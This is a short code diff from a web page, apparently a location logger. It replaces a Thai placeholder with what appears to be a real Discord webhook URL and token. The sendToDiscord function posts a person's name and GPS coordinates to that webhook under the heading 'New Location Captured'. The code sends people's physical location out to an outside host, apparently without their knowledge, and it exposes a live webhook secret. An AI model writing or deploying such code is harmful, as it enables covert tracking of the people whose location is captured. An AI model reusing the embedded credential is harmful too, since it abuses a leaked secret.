@@ -118,7 +118,7 @@
     });
 
     async function sendToDiscord(name, lat, lng) {
-      const webhook = "https://discord.com/api/webhooks/วินใส่ลิ้งตรงนี้นะจ๊ะ";
+      const webhook = "https://discordapp.com/api/webhooks/1391646097528717322/D3VW1hQsPPUiEFE9lTwhjfXaDyf2qLHaf9rWGPOSTcCEzaY1OuNNGdUyirbpimBPOlzI";
       const safeName = name.replace(/</g, "&lt;").replace(/>/g, "&gt;");
       const msg = {
         content: `📥 **New Location Captured**\n👤 Name: ${safeName}\n📍 https://maps.google.com/?q=${lat},${lng}`
